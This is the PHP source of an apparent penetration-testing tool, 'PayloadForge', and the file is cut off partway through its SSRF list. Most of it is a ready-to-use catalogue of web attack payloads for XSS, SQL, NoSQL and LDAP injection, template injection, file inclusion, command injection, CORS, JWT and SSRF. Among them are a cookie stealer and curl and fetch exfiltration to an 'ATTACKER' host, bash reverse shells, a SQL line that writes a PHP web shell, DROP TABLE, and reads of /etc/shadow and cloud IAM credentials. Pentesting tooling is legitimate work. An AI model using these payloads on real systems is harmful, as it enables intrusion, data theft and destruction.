<?php
// ─────────────────────────────────────────────────────────────────────────────
// SECURITY HEADERS
// ─────────────────────────────────────────────────────────────────────────────
header("X-Content-Type-Options: nosniff");
header("X-Frame-Options: DENY");
header("X-XSS-Protection: 1; mode=block");
header("Referrer-Policy: no-referrer");
header("Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src https://fonts.gstatic.com; img-src 'self' data:; frame-src *; connect-src 'none';");
// PayloadForge v3.0.0 | MIT | github.com/Juguitos/payloadforge
// ─────────────────────────────────────────────────────────────────────────────

// ── PAYLOAD DATABASE ─────────────────────────────────────────────────────────
$PAYLOADS = [
    "XSS" => [
        ["id"=>"xss01","name"=>'Basic Script Tag',"payload"=>"<script>alert('XSS')</script>","tags"=>["basic","reflected"],"source"=>"PATT"],
        ["id"=>"xss02","name"=>'IMG onerror',"payload"=>'<img src=x onerror=alert(1)>',"tags"=>["img","dom"],"source"=>"PATT"],
        ["id"=>"xss03","name"=>'SVG onload',"payload"=>'<svg onload=alert(1)>',"tags"=>["svg","dom"],"source"=>"PATT"],
        ["id"=>"xss04","name"=>'Details ontoggle',"payload"=>'<details open ontoggle=alert(1)>',"tags"=>["html5","dom"],"source"=>"PATT"],
        ["id"=>"xss05","name"=>'Input autofocus',"payload"=>'<input autofocus onfocus=alert(1)>',"tags"=>["input","dom"],"source"=>"PATT"],
        ["id"=>"xss06","name"=>'JS href protocol',"payload"=>'<a href="javascript:alert(1)">XSS</a>',"tags"=>["href","js"],"source"=>"PATT"],
        ["id"=>"xss07","name"=>'Iframe src JS',"payload"=>'<iframe src="javascript:alert(1)"></iframe>',"tags"=>["iframe","js"],"source"=>"PATT"],
        ["id"=>"xss08","name"=>'Body onpageshow',"payload"=>'<body onpageshow=alert(1)>',"tags"=>["body"],"source"=>"PATT"],
        ["id"=>"xss09","name"=>'Video onerror',"payload"=>'<video src=x onerror=alert(1)>',"tags"=>["video","html5"],"source"=>"PATT"],
        ["id"=>"xss10","name"=>'Eval atob bypass',"payload"=>"<script>eval(atob('YWxlcnQoMSk='))</script>","tags"=>["evasion","base64"],"source"=>"PATT"],
        ["id"=>"xss11","name"=>'Template string',"payload"=>'<script>alert`1`</script>',"tags"=>["template","bypass"],"source"=>"PATT"],
        ["id"=>"xss12","name"=>'Angular SSTI XSS',"payload"=>"{{constructor.constructor('alert(1)')()}}","tags"=>["angular","ssti"],"source"=>"PATT"],
        ["id"=>"xss13","name"=>'Polyglot',"payload"=>'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>>',"tags"=>["polyglot","advanced"],"source"=>"PATT"],
        ["id"=>"xss14","name"=>'DOM document.domain',"payload"=>'<img src=1 onerror=alert(document.domain)>',"tags"=>["dom","info-leak"],"source"=>"PATT"],
        ["id"=>"xss15","name"=>'Cookie stealer',"payload"=>"<script>document.location='http://ATTACKER/?c='+document.cookie</script>","tags"=>["cookie","exfil"],"source"=>"PF"],
        ["id"=>"xss16","name"=>'Object data JS',"payload"=>'<object data="javascript:alert(1)">',"tags"=>["object","bypass"],"source"=>"PATT"],
        ["id"=>"xss17","name"=>'onmouseover',"payload"=>'<div onmouseover=alert(1)>hover</div>',"tags"=>["event","dom"],"source"=>"PATT"],
        ["id"=>"xss18","name"=>'srcdoc iframe',"payload"=>'<iframe srcdoc="<script>alert(1)<\\/script>">',"tags"=>["iframe","srcdoc"],"source"=>"PATT"],
        ["id"=>"xss19","name"=>'Form action JS',"payload"=>'<form action="javascript:alert(1)"><input type=submit>',"tags"=>["form","js"],"source"=>"PATT"],
        ["id"=>"xss20","name"=>'Char code eval',"payload"=>'<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>',"tags"=>["charcode","evasion"],"source"=>"PF"],
    ],

    "SQLi" => [
        ["id"=>"sq01","name"=>'Classic OR bypass',"payload"=>"' OR '1'='1","tags"=>["auth-bypass","basic"],"source"=>"PATT"],
        ["id"=>"sq02","name"=>'Comment bypass (--)',"payload"=>"admin'--","tags"=>["auth-bypass","comment"],"source"=>"PATT"],
        ["id"=>"sq03","name"=>'Hash comment MySQL',"payload"=>"admin'#","tags"=>["auth-bypass","mysql"],"source"=>"PATT"],
        ["id"=>"sq04","name"=>'UNION 2 cols NULL',"payload"=>"' UNION SELECT NULL,NULL--","tags"=>["union","enum"],"source"=>"PATT"],
        ["id"=>"sq05","name"=>'UNION @@version MySQL',"payload"=>"' UNION SELECT @@version,NULL--","tags"=>["union","mysql","enum"],"source"=>"PATT"],
        ["id"=>"sq06","name"=>'UNION @@version MSSQL',"payload"=>"' UNION SELECT @@version,NULL,NULL--","tags"=>["union","mssql","enum"],"source"=>"PATT"],
        ["id"=>"sq07","name"=>'Dump table names',"payload"=>"' UNION SELECT table_name,NULL FROM information_schema.tables--","tags"=>["union","mysql","schema"],"source"=>"PATT"],
        ["id"=>"sq08","name"=>'MSSQL WAITFOR (time)',"payload"=>"'; WAITFOR DELAY '0:0:5'--","tags"=>["blind","time","mssql"],"source"=>"PATT"],
        ["id"=>"sq09","name"=>'MySQL SLEEP (time)',"payload"=>"' AND SLEEP(5)--","tags"=>["blind","time","mysql"],"source"=>"PATT"],
        ["id"=>"sq10","name"=>'PostgreSQL pg_sleep',"payload"=>"'; SELECT pg_sleep(5)--","tags"=>["blind","time","pgsql"],"source"=>"PATT"],
        ["id"=>"sq11","name"=>'Boolean TRUE',"payload"=>"' AND 1=1--","tags"=>["blind","boolean"],"source"=>"PATT"],
        ["id"=>"sq12","name"=>'Boolean FALSE',"payload"=>"' AND 1=2--","tags"=>["blind","boolean"],"source"=>"PATT"],
        ["id"=>"sq13","name"=>'Error ExtractValue',"payload"=>"' AND EXTRACTVALUE(1,CONCAT(0x7e,@@version))--","tags"=>["error-based","mysql"],"source"=>"PATT"],
        ["id"=>"sq14","name"=>'Stacked DROP TABLE',"payload"=>"'; DROP TABLE users--","tags"=>["stacked","destructive"],"source"=>"PATT"],
        ["id"=>"sq15","name"=>'MySQL INTO OUTFILE',"payload"=>'\' UNION SELECT \'<?php system($_GET["cmd"]);?>\' INTO OUTFILE \'/var/www/html/sh.php\'--',"tags"=>["file-write","rce","mysql"],"source"=>"PATT"],
        ["id"=>"sq16","name"=>'ORDER BY column enum',"payload"=>"' ORDER BY 1--","tags"=>["enum","columns"],"source"=>"PATT"],
        ["id"=>"sq17","name"=>'UNION user/password',"payload"=>"' UNION SELECT username,password FROM users--","tags"=>["union","creds"],"source"=>"PATT"],
        ["id"=>"sq18","name"=>'Substring blind extract',"payload"=>"' AND SUBSTRING(username,1,1)='a'--","tags"=>["blind","boolean","extract"],"source"=>"PATT"],
        ["id"=>"sq19","name"=>'Load_File read',"payload"=>"' UNION SELECT LOAD_FILE('/etc/passwd'),NULL--","tags"=>["file-read","mysql"],"source"=>"PATT"],
        ["id"=>"sq20","name"=>'XML UpdateXML error',"payload"=>"' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version())),1)--","tags"=>["error-based","mysql"],"source"=>"PATT"],
    ],

    "SSTI" => [
        ["id"=>"st01","name"=>'Jinja2 Math detect',"payload"=>'{{7*7}}',"tags"=>["jinja2","detect"],"source"=>"PATT"],
        ["id"=>"st02","name"=>'Jinja2 String*Int',"payload"=>"{{7*'7'}}","tags"=>["jinja2","detect"],"source"=>"PATT"],
        ["id"=>"st03","name"=>'Jinja2 Config dump',"payload"=>'{{config}}',"tags"=>["jinja2","info-leak"],"source"=>"PATT"],
        ["id"=>"st04","name"=>'Jinja2 Config items',"payload"=>'{{config.items()}}',"tags"=>["jinja2","info-leak"],"source"=>"PATT"],
        ["id"=>"st05","name"=>'Jinja2 RCE subprocess',"payload"=>"{{''.__class__.__mro__[1].__subclasses__()[401]('id',shell=True,stdout=-1).communicate()[0].strip()}}","tags"=>["jinja2","rce","advanced"],"source"=>"PATT"],
        ["id"=>"st06","name"=>'Jinja2 lipsum RCE',"payload"=>"{{lipsum.__globals__['os'].popen('id').read()}}","tags"=>["jinja2","rce"],"source"=>"PATT"],
        ["id"=>"st07","name"=>'Twig detect',"payload"=>"{{7*'7'}}","tags"=>["twig","detect"],"source"=>"PATT"],
        ["id"=>"st08","name"=>'Twig RCE filter',"payload"=>"{{'id'|filter('system')}}","tags"=>["twig","rce"],"source"=>"PATT"],
        ["id"=>"st09","name"=>'Freemarker detect',"payload"=>'${7*7}',"tags"=>["freemarker","detect"],"source"=>"PATT"],
        ["id"=>"st10","name"=>'Freemarker RCE',"payload"=>'<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',"tags"=>["freemarker","rce"],"source"=>"PATT"],
        ["id"=>"st11","name"=>'Smarty detect',"payload"=>'{$smarty.version}',"tags"=>["smarty","detect"],"source"=>"PATT"],
        ["id"=>"st12","name"=>'Smarty RCE',"payload"=>"{system('id')}","tags"=>["smarty","rce"],"source"=>"PATT"],
        ["id"=>"st13","name"=>'ERB Ruby detect',"payload"=>'<%= 7*7 %>',"tags"=>["erb","ruby","detect"],"source"=>"PATT"],
        ["id"=>"st14","name"=>'ERB Ruby RCE',"payload"=>'<%= `id` %>',"tags"=>["erb","ruby","rce"],"source"=>"PATT"],
        ["id"=>"st15","name"=>'Tornado detect',"payload"=>'{{7*7}}',"tags"=>["tornado","detect"],"source"=>"PATT"],
        ["id"=>"st16","name"=>'Tornado RCE import os',"payload"=>"{% import os %}{{os.popen('id').read()}}","tags"=>["tornado","rce"],"source"=>"PATT"],
        ["id"=>"st17","name"=>'Velocity detect',"payload"=>'#set($x=7*7)${x}',"tags"=>["velocity","detect"],"source"=>"PATT"],
        ["id"=>"st18","name"=>'Mako RCE',"payload"=>"\${__import__('os').popen('id').read()}","tags"=>["mako","python","rce"],"source"=>"PATT"],
    ],

    "LFI" => [
        ["id"=>"lf01","name"=>'Basic /etc/passwd',"payload"=>'../../../etc/passwd',"tags"=>["linux","basic"],"source"=>"PATT"],
        ["id"=>"lf02","name"=>'Deep traversal',"payload"=>'../../../../../../../../etc/passwd',"tags"=>["linux","deep"],"source"=>"PATT"],
        ["id"=>"lf03","name"=>'Null Byte bypass',"payload"=>'../../../etc/passwd%00',"tags"=>["null-byte","bypass"],"source"=>"PATT"],
        ["id"=>"lf04","name"=>'Double URL encode',"payload"=>'..%252f..%252f..%252fetc%252fpasswd',"tags"=>["double-encode","bypass"],"source"=>"PATT"],
        ["id"=>"lf05","name"=>'Path normalize bypass',"payload"=>'....//....//....//etc/passwd',"tags"=>["normalization","bypass"],"source"=>"PATT"],
        ["id"=>"lf06","name"=>'PHP filter base64',"payload"=>'php://filter/convert.base64-encode/resource=index.php',"tags"=>["php","wrapper","source"],"source"=>"PATT"],
        ["id"=>"lf07","name"=>'PHP filter rot13',"payload"=>'php://filter/read=string.rot13/resource=index.php',"tags"=>["php","wrapper","bypass"],"source"=>"PATT"],
        ["id"=>"lf08","name"=>'PHP input RCE',"payload"=>"php://input [POST: <?php system('id');?>]","tags"=>["php","rce","input"],"source"=>"PATT"],
        ["id"=>"lf09","name"=>'Data URI RCE',"payload"=>'data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=',"tags"=>["php","rce","data-uri"],"source"=>"PATT"],
        ["id"=>"lf10","name"=>'Proc self environ',"payload"=>'../../../proc/self/environ',"tags"=>["linux","log-poison"],"source"=>"PATT"],
        ["id"=>"lf11","name"=>'Proc self cmdline',"payload"=>'../../../proc/self/cmdline',"tags"=>["linux","info-leak"],"source"=>"PATT"],
        ["id"=>"lf12","name"=>'Windows win.ini',"payload"=>'..\\..\\..\\windows\\win.ini',"tags"=>["windows","basic"],"source"=>"PATT"],
        ["id"=>"lf13","name"=>'Windows hosts file',"payload"=>'../../../../windows/system32/drivers/etc/hosts',"tags"=>["windows","hosts"],"source"=>"PATT"],
        ["id"=>"lf14","name"=>'Apache access.log',"payload"=>'../../../var/log/apache2/access.log',"tags"=>["log-poison","apache"],"source"=>"PATT"],
        ["id"=>"lf15","name"=>'SSH auth.log',"payload"=>'../../../var/log/auth.log',"tags"=>["log-poison","ssh"],"source"=>"PATT"],
        ["id"=>"lf16","name"=>'Zip wrapper RCE',"payload"=>'zip://path/to/upload.zip#shell.php',"tags"=>["php","wrapper","zip"],"source"=>"PATT"],
        ["id"=>"lf17","name"=>'phar wrapper',"payload"=>'phar://./uploads/evil.phar/shell.php',"tags"=>["php","phar","rce"],"source"=>"PF"],
        ["id"=>"lf18","name"=>'/etc/shadow',"payload"=>'../../../etc/shadow',"tags"=>["linux","creds"],"source"=>"PF"],
    ],

    "IDOR" => [
        ["id"=>"id01","name"=>'Sequential numeric ID',"payload"=>'/api/users/1',"tags"=>["horizontal","basic"],"source"=>"PATT"],
        ["id"=>"id02","name"=>'Zero index',"payload"=>'/api/users/0',"tags"=>["horizontal","zero"],"source"=>"PATT"],
        ["id"=>"id03","name"=>'Negative ID',"payload"=>'/api/users/-1',"tags"=>["horizontal","negative"],"source"=>"PATT"],
        ["id"=>"id04","name"=>'UUID v4 sequential',"payload"=>'/api/orders/00000000-0000-0000-0000-000000000001',"tags"=>["uuid","enum"],"source"=>"PATT"],
        ["id"=>"id05","name"=>'Base64 encoded ID',"payload"=>'/api/profile/dXNlcklkPTEyMw==',"tags"=>["base64","obfuscated"],"source"=>"PATT"],
        ["id"=>"id06","name"=>'MD5 hashed ID',"payload"=>'/api/user/c4ca4238a0b923820dcc509a6f75849b',"tags"=>["md5","obfuscated"],"source"=>"PATT"],
        ["id"=>"id07","name"=>'HTTP param pollution',"payload"=>'/api/account?id=1&id=2',"tags"=>["param-pollution","bypass"],"source"=>"PATT"],
        ["id"=>"id08","name"=>'Mass assignment JSON',"payload"=>'{"id":1,"role":"admin","isAdmin":true}',"tags"=>["mass-assign","priv-esc"],"source"=>"PATT"],
        ["id"=>"id09","name"=>'GUID v1 brute',"payload"=>'/api/invoice/00000000-0000-1000-8000-000000000001',"tags"=>["guid","v1","brute"],"source"=>"PF"],
        ["id"=>"id10","name"=>'Path traversal via IDOR',"payload"=>'/api/files/../../etc/passwd',"tags"=>["lfi","combined"],"source"=>"PATT"],
        ["id"=>"id11","name"=>'GraphQL IDOR query',"payload"=>'query { user(id: "1") { email password } }',"tags"=>["graphql","enum"],"source"=>"PATT"],
        ["id"=>"id12","name"=>'S3 bucket direct',"payload"=>'https://BUCKET.s3.amazonaws.com/private/user_1/data.csv',"tags"=>["s3","aws","cloud"],"source"=>"PATT"],
        ["id"=>"id13","name"=>'Referer header bypass',"payload"=>'Referer: /admin/users/1/edit',"tags"=>["header","bypass"],"source"=>"PATT"],
        ["id"=>"id14","name"=>'JSON horizontal priv',"payload"=>'{"userId":"victim_id","action":"delete"}',"tags"=>["json","horizontal"],"source"=>"PATT"],
        ["id"=>"id15","name"=>'Wildcard object ref',"payload"=>'/api/users/*',"tags"=>["wildcard","enum"],"source"=>"PF"],
        ["id"=>"id16","name"=>'Account takeover token',"payload"=>'/api/reset?token=0000000000000000&user=victim@email.com',"tags"=>["account-takeover","token"],"source"=>"PF"],
    ],

    "CmdInj" => [
        ["id"=>"ci01","name"=>'Semicolon chain',"payload"=>'127.0.0.1; id',"tags"=>["basic","linux"],"source"=>"PATT"],
        ["id"=>"ci02","name"=>'Pipe chain',"payload"=>'127.0.0.1 | id',"tags"=>["pipe","linux"],"source"=>"PATT"],
        ["id"=>"ci03","name"=>'Double pipe OR',"payload"=>'127.0.0.1 || id',"tags"=>["or","linux"],"source"=>"PATT"],
        ["id"=>"ci04","name"=>'Backtick RCE',"payload"=>'`id`',"tags"=>["backtick","linux"],"source"=>"PATT"],
        ["id"=>"ci05","name"=>'Subshell $()',"payload"=>'$(id)',"tags"=>["subshell","linux"],"source"=>"PATT"],
        ["id"=>"ci06","name"=>'Newline bypass',"payload"=>'127.0.0.1%0aid',"tags"=>["newline","bypass"],"source"=>"PATT"],
        ["id"=>"ci07","name"=>'IFS bypass',"payload"=>'cat${IFS}/etc/passwd',"tags"=>["IFS","spaces","bypass"],"source"=>"PATT"],
        ["id"=>"ci08","name"=>'Base64 rev shell',"payload"=>"echo 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'|base64|bash","tags"=>["reverse-shell","b64"],"source"=>"PF"],
        ["id"=>"ci09","name"=>'Windows & chain',"payload"=>'127.0.0.1 & whoami',"tags"=>["windows","basic"],"source"=>"PATT"],
        ["id"=>"ci10","name"=>'Windows | chain',"payload"=>'127.0.0.1 | whoami',"tags"=>["windows","pipe"],"source"=>"PATT"],
        ["id"=>"ci11","name"=>'PowerShell exec',"payload"=>'; powershell -c whoami',"tags"=>["windows","powershell"],"source"=>"PATT"],
        ["id"=>"ci12","name"=>'Out-of-band curl',"payload"=>'127.0.0.1; curl http://ATTACKER/?x=$(whoami)',"tags"=>["oob","exfil"],"source"=>"PF"],
        ["id"=>"ci13","name"=>'Time-based blind',"payload"=>'; sleep 5',"tags"=>["blind","time"],"source"=>"PATT"],
        ["id"=>"ci14","name"=>'Glob bypass',"payload"=>'/???/??t /etc/passwd',"tags"=>["glob","bypass"],"source"=>"PATT"],
        ["id"=>"ci15","name"=>'Hex encoding bypass',"payload"=>'$(printf "\\x69\\x64")',"tags"=>["hex","bypass"],"source"=>"PATT"],
        ["id"=>"ci16","name"=>'Read /etc/passwd',"payload"=>'; cat /etc/passwd',"tags"=>["linux","exfil"],"source"=>"PF"],
    ],

    "CORS" => [
        ["id"=>"co01","name"=>'Origin reflection test',"payload"=>'Origin: https://evil.com',"tags"=>["header","basic"],"source"=>"PATT"],
        ["id"=>"co02","name"=>'Null origin',"payload"=>'Origin: null',"tags"=>["null","bypass"],"source"=>"PATT"],
        ["id"=>"co03","name"=>'Subdomain prefix attack',"payload"=>'Origin: https://evil.TARGET.com',"tags"=>["subdomain","bypass"],"source"=>"PATT"],
        ["id"=>"co04","name"=>'Subdomain suffix attack',"payload"=>'Origin: https://TARGET.com.evil.com',"tags"=>["suffix","bypass"],"source"=>"PATT"],
        ["id"=>"co05","name"=>'HTTP downgrade',"payload"=>'Origin: http://TARGET.com',"tags"=>["http","downgrade"],"source"=>"PATT"],
        ["id"=>"co06","name"=>'CORS PoC fetch',"payload"=>"fetch('https://TARGET.com/api/secret',{credentials:'include'}).then(r=>r.text()).then(d=>fetch('http://ATTACKER/?x='+btoa(d)))","tags"=>["poc","js","exfil"],"source"=>"PF"],
        ["id"=>"co07","name"=>'XHR with credentials',"payload"=>"var x=new XMLHttpRequest();x.open('GET','https://TARGET.com/api/private',true);x.withCredentials=true;x.onload=()=>fetch('http://ATTACKER/?d='+btoa(x.responseText));x.send();","tags"=>["xhr","credentials"],"source"=>"PF"],
        ["id"=>"co08","name"=>'Wildcard check',"payload"=>'Origin: https://anything.com',"tags"=>["wildcard","detect"],"source"=>"PF"],
        ["id"=>"co09","name"=>'localhost origin',"payload"=>'Origin: http://localhost',"tags"=>["localhost","internal"],"source"=>"PATT"],
        ["id"=>"co10","name"=>'CORS + CSRF exfil',"payload"=>"<script>fetch('https://TARGET.com/api/user',{credentials:'include'}).then(r=>r.json()).then(d=>document.location='http://ATTACKER/?j='+JSON.stringify(d))</script>","tags"=>["csrf","exfil"],"source"=>"PF"],
        ["id"=>"co11","name"=>'Pre-flight OPTIONS test',"payload"=>"OPTIONS /api/data HTTP/1.1\r\nOrigin: https://evil.com\r\nAccess-Control-Request-Method: DELETE","tags"=>["preflight","options"],"source"=>"PATT"],
        ["id"=>"co12","name"=>'Trusted subdomain XSS',"payload"=>'Origin: https://xss.subdomain.TARGET.com',"tags"=>["xss","subdomain"],"source"=>"PF"],
    ],

    "JWT" => [
        ["id"=>"jw01","name"=>'alg:none attack',"payload"=>'{"alg":"none","typ":"JWT"}',"tags"=>["alg-none","critical"],"source"=>"PATT"],
        ["id"=>"jw02","name"=>'alg:None (capital N)',"payload"=>'{"alg":"None","typ":"JWT"}',"tags"=>["alg-none","bypass"],"source"=>"PATT"],
        ["id"=>"jw03","name"=>'Admin role escalation',"payload"=>'{"sub":"user","role":"admin","iat":1700000000}',"tags"=>["priv-esc","claims"],"source"=>"PF"],
        ["id"=>"jw04","name"=>'Remove expiry',"payload"=>'{"sub":"user","exp":9999999999,"iat":1700000000}',"tags"=>["exp","bypass"],"source"=>"PF"],
        ["id"=>"jw05","name"=>'kid path traversal',"payload"=>'{"alg":"HS256","kid":"../../dev/null"}',"tags"=>["kid","lfi","critical"],"source"=>"PATT"],
        ["id"=>"jw06","name"=>'kid SQL injection',"payload"=>'{\'alg\':\'HS256\',\'kid\':"x\' UNION SELECT \'secret\'-- -"}',"tags"=>["kid","sqli"],"source"=>"PATT"],
        ["id"=>"jw07","name"=>'jku header injection',"payload"=>'{"alg":"RS256","jku":"https://ATTACKER/jwks.json"}',"tags"=>["jku","ssrf"],"source"=>"PATT"],
        ["id"=>"jw08","name"=>'x5u header injection',"payload"=>'{"alg":"RS256","x5u":"https://ATTACKER/cert.pem"}',"tags"=>["x5u","ssrf"],"source"=>"PATT"],
        ["id"=>"jw09","name"=>'isAdmin claim inject',"payload"=>'{"sub":"user","isAdmin":true,"userId":1}',"tags"=>["claims","priv-esc"],"source"=>"PF"],
        ["id"=>"jw10","name"=>'Blank signature (none)',"payload"=>'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9.',"tags"=>["alg-none","pre-built"],"source"=>"PF"],
        ["id"=>"jw11","name"=>'Embedded JWK self-sign',"payload"=>'{"alg":"RS256","jwk":{"kty":"RSA","n":"ATTACKER_N","e":"AQAB"}}',"tags"=>["jwk","critical"],"source"=>"PATT"],
        ["id"=>"jw12","name"=>'HS256 weak secret brute',"payload"=>'hashcat -a 0 -m 16500 token.jwt wordlist.txt',"tags"=>["brute","weak-secret"],"source"=>"PF"],
    ],

    "LDAP" => [
        ["id"=>"ld01","name"=>'Auth bypass (*)',"payload"=>'*)(&',"tags"=>["auth-bypass","basic"],"source"=>"PATT"],
        ["id"=>"ld02","name"=>'Always true inject',"payload"=>'*)(uid=*))(|(uid=*',"tags"=>["always-true","bypass"],"source"=>"PATT"],
        ["id"=>"ld03","name"=>'Admin login bypass',"payload"=>'admin)(&(password=*))',"tags"=>["auth-bypass","admin"],"source"=>"PATT"],
        ["id"=>"ld04","name"=>'Wildcard inject',"payload"=>'*',"tags"=>["wildcard","enum"],"source"=>"PATT"],
        ["id"=>"ld05","name"=>'OR injection',"payload"=>'admin)(|(password=*))',"tags"=>["or","enum"],"source"=>"PATT"],
        ["id"=>"ld06","name"=>'Blind attr extraction',"payload"=>'admin)(|(description=a*))',"tags"=>["blind","extract"],"source"=>"PATT"],
        ["id"=>"ld07","name"=>'DN inject',"payload"=>'cn=admin,dc=example,dc=com)(|(cn=*',"tags"=>["dn","advanced"],"source"=>"PATT"],
        ["id"=>"ld08","name"=>'userPassword dump',"payload"=>'*)(|(userPassword=*))',"tags"=>["creds","dump"],"source"=>"PF"],
        ["id"=>"ld09","name"=>'Mail attr dump',"payload"=>'*)(mail=*',"tags"=>["mail","enum"],"source"=>"PF"],
        ["id"=>"ld10","name"=>'Filter escape',"payload"=>'\\2a)(uid=*))(|(uid=\\2a',"tags"=>["escape","bypass"],"source"=>"PATT"],
        ["id"=>"ld11","name"=>'Null byte bypass',"payload"=>'admin\\00',"tags"=>["null-byte","bypass"],"source"=>"PATT"],
        ["id"=>"ld12","name"=>'Password hint extract',"payload"=>'admin)(|(pwdHint=*))',"tags"=>["password","hint"],"source"=>"PF"],
    ],

    "NoSQL" => [
        ["id"=>"ns01","name"=>'MongoDB auth bypass',"payload"=>'{"username":{"$gt":""},"password":{"$gt":""}}',"tags"=>["mongodb","auth-bypass"],"source"=>"PATT"],
        ["id"=>"ns02","name"=>'$ne operator bypass',"payload"=>'{"username":"admin","password":{"$ne":"invalid"}}',"tags"=>["ne","bypass"],"source"=>"PATT"],
        ["id"=>"ns03","name"=>'$regex login bypass',"payload"=>'{"username":{"$regex":"admin"},"password":{"$regex":".*"}}',"tags"=>["regex","bypass"],"source"=>"PATT"],
        ["id"=>"ns04","name"=>'URL param injection',"payload"=>'?username[$ne]=invalid&password[$ne]=invalid',"tags"=>["url","param"],"source"=>"PATT"],
        ["id"=>"ns05","name"=>'$where JS injection',"payload"=>'{"$where":"this.username==\'admin\'&&this.password.match(/.*/)>0"}',"tags"=>["where","js"],"source"=>"PATT"],
        ["id"=>"ns06","name"=>'$in array bypass',"payload"=>'{"username":{"$in":["admin","root"]},"password":{"$ne":""}}',"tags"=>["in","enum"],"source"=>"PATT"],
        ["id"=>"ns07","name"=>'Blind extract $regex',"payload"=>'{"username":"admin","password":{"$regex":"^a"}}',"tags"=>["blind","regex","extract"],"source"=>"PATT"],
        ["id"=>"ns08","name"=>'$exists dump',"payload"=>'{"username":{"$exists":true},"password":{"$exists":true}}',"tags"=>["exists","dump"],"source"=>"PATT"],
        ["id"=>"ns09","name"=>'Redis KEYS dump',"payload"=>'KEYS *',"tags"=>["redis","dump"],"source"=>"PATT"],
        ["id"=>"ns10","name"=>'CouchDB all_docs',"payload"=>'/_all_docs?include_docs=true',"tags"=>["couchdb","dump"],"source"=>"PATT"],
        ["id"=>"ns11","name"=>'GraphQL NoSQL inject',"payload"=>'{ user(username: {"$regex": ".*"}) { id email password } }',"tags"=>["graphql","nosql"],"source"=>"PF"],
        ["id"=>"ns12","name"=>'Mongoose type cast',"payload"=>'{"username":"admin","password":{"$gt":0}}',"tags"=>["mongoose","typecast"],"source"=>"PF"],
    ],

    "SSI" => [
        ["id"=>"si01","name"=>'Exec cmd (Linux)',"payload"=>'<!--#exec cmd="id" -->',"tags"=>["exec","linux","rce"],"source"=>"PATT"],
        ["id"=>"si02","name"=>'Exec cmd (Windows)',"payload"=>'<!--#exec cmd="whoami" -->',"tags"=>["exec","windows","rce"],"source"=>"PATT"],
        ["id"=>"si03","name"=>'Include /etc/passwd',"payload"=>'<!--#include virtual="/etc/passwd" -->',"tags"=>["include","lfi"],"source"=>"PATT"],
        ["id"=>"si04","name"=>'Include /etc/shadow',"payload"=>'<!--#include file="/etc/shadow" -->',"tags"=>["include","creds"],"source"=>"PATT"],
        ["id"=>"si05","name"=>'Print env vars',"payload"=>'<!--#printenv -->',"tags"=>["env","info-leak"],"source"=>"PATT"],
        ["id"=>"si06","name"=>'Echo DATE',"payload"=>'<!--#echo var="DATE_LOCAL" -->',"tags"=>["echo","detect"],"source"=>"PATT"],
        ["id"=>"si07","name"=>'Echo DOCUMENT_NAME',"payload"=>'<!--#echo var="DOCUMENT_NAME" -->',"tags"=>["echo","info-leak"],"source"=>"PATT"],
        ["id"=>"si08","name"=>'Exec /bin/cat',"payload"=>'<!--#exec cmd="/bin/cat /etc/passwd" -->',"tags"=>["exec","exfil"],"source"=>"PATT"],
        ["id"=>"si09","name"=>'Set variable detect',"payload"=>'<!--#set var="test" value="1" --><!--#echo var="test" -->',"tags"=>["set","detect"],"source"=>"PATT"],
        ["id"=>"si10","name"=>'Reverse shell via exec',"payload"=>'<!--#exec cmd="bash -i >& /dev/tcp/ATTACKER/4444 0>&1" -->',"tags"=>["revshell","exec"],"source"=>"PF"],
        ["id"=>"si11","name"=>'fsize info leak',"payload"=>'<!--#fsize file="/etc/passwd" -->',"tags"=>["fsize","info-leak"],"source"=>"PATT"],
        ["id"=>"si12","name"=>'Include CGI RCE',"payload"=>'<!--#include virtual="/cgi-bin/shell.cgi?cmd=id" -->',"tags"=>["cgi","rce"],"source"=>"PATT"],
    ],

    "SSRF" => [
        ["id"=>"ss01","name"=>'Localhost HTTP',"payload"=>'http://localhost/admin',"tags"=>["localhost","basic"],"source"=>"PATT"],
        ["id"=>"ss02","name"=>'127.0.0.1',"payload"=>'http://127.0.0.1/admin',"tags"=>["loopback","basic"],"source"=>"PATT"],
        ["id"=>"ss03","name"=>'0.0.0.0',"payload"=>'http://0.0.0.0:80/admin',"tags"=>["loopback","bypass"],"source"=>"PATT"],
        ["id"=>"ss04","name"=>'AWS metadata v1',"payload"=>'http://169.254.169.254/latest/meta-data/',"tags"=>["aws","metadata","cloud"],"source"=>"PATT"],
        ["id"=>"ss05","name"=>'AWS IAM credentials',"payload"=>'http://169.254.169.254/latest/meta-data/iam/security-credentials/',"tags"=>["aws","iam","creds"],"source"=>"PATT"],
        ["id"=>"ss06","name"=>'GCP metadata',"payload"=>'http://metadata.google.internal/computeMetadata/v1/',"tags"=>["gcp","metadata","cloud"],"source"=>"PATT"],
        ["id"=>"ss07","name"=>'Azure metadata',"payload"=>'http://169.254.169.254/metadata/instance?api-version=2021-02-01',"tags"=>["azure","cloud"],"source"=>"PATT"],
        ["id"=>"ss08","name"=>'File protocol',"payload"=>'file:///etc/passwd',"tags"=>["file","lfi"],"source"=>"PATT"],
        ["id"=>"ss09","name"=>'Dict port scan',"payload"=>'dict://127.0.0.1:22/INFO',"tags"=>["dict","portscan"],"source"=>"PATT"],
        ["id"=>"ss10","name"=>'Gopher Redis',"payload"=>'gopher://127.0.0.1:6379/_INFO',"tags"=>["gopher","redis"],"source"=>"PATT"],
        ["id"=>"ss11","name"=>'IPv6 loopback',"payload"=>'http://[::1]/admin',"tags"=>["ipv6","bypass"],"source"=>"PATT"],
        ["id"=>"ss12","name"=>'Decimal IP bypass',"payload"=>'http://2130706433/admin',"tags"=>["decimal","bypass"],"source"=>"PATT"],
        ["id"=>"ss13","name"=>'Hex encoded IP',"payload"=>'http://0x7f000001/admin',"tags"=>["hex","bypass"],"source"=>"PATT"],
        ["id"=>"ss14","name"=>'Internal network scan',"payload"=>'http://192.168.1.1/',"tags"=>["internal","scan"],"source"=>"PF"],
